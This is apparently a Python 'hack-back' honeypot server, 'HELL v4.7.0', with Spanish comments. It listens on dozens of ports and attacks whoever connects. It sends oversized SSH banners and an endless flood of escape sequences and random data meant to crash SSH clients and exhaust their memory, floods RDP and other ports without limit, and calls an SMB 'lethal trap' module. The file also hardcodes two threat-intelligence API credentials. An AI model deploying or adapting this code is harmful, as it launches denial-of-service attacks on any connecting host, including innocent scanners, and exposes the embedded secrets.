import socket
import threading
import time
import os
import binascii
import random
import requests
from datetime import datetime
from threat_intel import VirusTotalReporter, IsMaliciousReporter
from scripts import smb_lethal

# CONFIGURACIÓN HELL v4.7.0: SSH CLIENT CRUSHER & RESOURCE EXHAUSTION
HOST = '0.0.0.0'
WEB_PORTS = [80, 443, 8080, 8081, 8082, 8090, 8443, 9200]
LETHAL_PORTS = [22, 2222, 3389, 4455]
RAW_PORTS = [21, 23, 25, 445, 1433, 2323, 2525, 3306, 6379, 1337, 2375, 8125, 5060, 5900, 110, 5555]
AD_PORTS = [53, 88, 135, 389, 636, 3268, 5985]
AI_PORTS = [11434, 8188, 1234, 3000]
VULN_PORTS = [10443]

PORTS = WEB_PORTS + LETHAL_PORTS + RAW_PORTS + AD_PORTS + AI_PORTS + VULN_PORTS
LOG_FILE = "logs/hell_activity.log"

VT_KEY = os.getenv("VT_API_KEY", "")
ISM_KEY = "b0959d3e-97c6-451f-9f95-5148c2da7ddd"
ISM_SECRET = "643a5731-1af4-4632-b75c-65955138288a"
MY_IP = os.getenv("MY_IP", "127.0.0.1")

class HellServer:
    def __init__(self):
        os.makedirs("logs", exist_ok=True)
        self.vt_reporter = VirusTotalReporter(VT_KEY)
        self.ism_reporter = IsMaliciousReporter(ISM_KEY, ISM_SECRET)
        self.whitelist = {MY_IP, "127.0.0.1"}
        print(f"HELL CORE v4.7.0: SSH Killbox Enhanced (RAM/CPU Exhaustion).")

    def log_event(self, ip, local_port, scanner, status="START", duration=0, bytes_sent=0):
        timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
        if status == "START":
            log_entry = f"\n[+] LETHAL SSH TARGET DETECTED: {timestamp} | IP: {ip} | Port: {local_port}\n"
        else:
            mb_sent = round(bytes_sent / (1024 * 1024), 2)
            log_entry = f"[-] SSH THREAT CRUSHED: {timestamp} | Time: {round(duration, 2)}s | Data: {mb_sent}MB | Mode: {status}\n"
        with open(LOG_FILE, "a", encoding='utf-8') as f: f.write(log_entry)

    def ssh_client_crusher(self, client_socket, ip):
        """Ataque salvaje para agotar RAM y colapsar terminales de atacantes SSH"""
        print(f"!!! [⚔️] Iniciando SSH Client Crusher contra {ip} !!!")
        total_sent = 0
        try:
            # 1. Version String Bomb (Exceder los 255 bytes estándar)
            long_banner = "SSH-2.0-OpenSSH_8.9p1" + ("A" * 5000) + "\r\n"
            client_socket.send(long_banner.encode())
            total_sent += len(long_banner)
            time.sleep(1)

            # 2. Resource Exhaustion & Terminal Garbling
            # Inyectamos secuencias de escape y bloques de datos masivos (CVE-2025-26466 style)
            while True:
                # \x1b[2J\x1b[H = Clear Screen (Para humanos)
                # os.urandom(65536) = Presión de RAM (Para bots)
                payload = b"\x1b[2J\x1b[H" + os.urandom(65536)
                client_socket.send(payload)
                total_sent += len(payload)
                # Sin pausas para saturar el ancho de banda y la memoria
        except:
            return total_sent

    def handle_client(self, client_socket, addr, local_port):
        ip = addr[0]
        if ip in self.whitelist:
            client_socket.close(); return

        start_time = time.time()
        total_bytes_sent = 0
        mode = "Neutralized"

        try:
            client_socket.settimeout(10.0)
            self.log_event(ip, local_port, "Unknown", status="START")

            # --- LÓGICA DE SSH KILLBOX (Puertos 22 y 2222) ---
            if local_port in [22, 2222]:
                mode = "SSH Client Crusher"
                total_bytes_sent = self.ssh_client_crusher(client_socket, ip)
                return

            # --- RDP KILLBOX ---
            elif local_port == 3389:
                mode = "Wild RDP Killbox"
                client_socket.send(binascii.unhexlify("0300000b06d00000123400"))
                heavy_payload = os.urandom(1024 * 1024) 
                while True:
                    client_socket.send(heavy_payload)
                    total_bytes_sent += len(heavy_payload)

            # --- SMB LETHAL TRAP ---
            elif local_port == 445:
                mode = "SMB Lethal Trap"
                total_bytes_sent = smb_lethal.handle_smb_attack(client_socket, ip, (lambda *args, **kwargs: None), local_port)
            
            else:
                while True:
                    chunk = os.urandom(65536)
                    client_socket.send(chunk)
                    total_bytes_sent += len(chunk)
                    time.sleep(0.1)

        except: pass
        finally:
            duration = time.time() - start_time
            self.log_event(ip, local_port, None, status=mode, duration=duration, bytes_sent=total_bytes_sent)
            try: client_socket.close()
            except: pass

    def start_listener(self, port):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            server.bind((HOST, port))
            server.listen(100)
            while True:
                client, addr = server.accept()
                threading.Thread(target=self.handle_client, args=(client, addr, port), daemon=True).start()
        except: pass

    def start(self):
        for port in PORTS:
            threading.Thread(target=self.start_listener, args=(port,), daemon=True).start()
        while True:
            try: time.sleep(1)
            except KeyboardInterrupt: break

if __name__ == "__main__":
    HellServer().start()
